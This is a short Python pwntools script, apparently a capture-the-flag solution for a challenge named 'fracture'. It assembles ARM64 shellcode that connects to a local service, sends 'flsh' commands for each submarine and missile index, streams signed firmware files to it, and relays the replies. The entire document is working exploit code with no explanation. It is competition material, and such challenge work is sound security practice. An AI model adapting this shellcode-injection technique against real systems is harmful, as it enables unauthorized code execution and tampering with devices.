from pwn import *

context.binary = ELF("/home/kali/cybertalent/fracture")

command = b"flsh"
shellcode = ""

for i in range(5):
    firmware = f"/firmware/missile.1.3.37.fw_sub{i + 1}_signed"
    submarine = p16(i)
    for j in range(16):
        missile = p16(j)
        full_command = command + submarine + missile
        shellcode += shellcraft.connect("127.0.0.1", 1025)
        shellcode += shellcraft.write("x12", full_command, len(full_command))
        shellcode += shellcraft.cat(firmware, "x12")
        shellcode += shellcraft.pushstr("\x02".ljust(0x10, "\x00"), append_null=False)
        shellcode += shellcraft.nanosleep("sp")
        shellcode += shellcraft.read("x12", "sp", 0x100)
        shellcode += shellcraft.mov("x11", "x0")
        shellcode += shellcraft.close("x12")
        shellcode += shellcraft.write(0x4, "sp", "x11")
shellcode += shellcraft.exit(69)

compiled_shellcode = asm(shellcode)
print("Length of shellcode:", len(compiled_shellcode))
print(enhex(compiled_shellcode))
